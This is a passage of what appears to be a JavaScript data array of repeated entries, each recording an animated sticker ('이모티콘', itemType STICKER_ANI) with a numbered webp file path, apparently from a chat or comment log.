      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
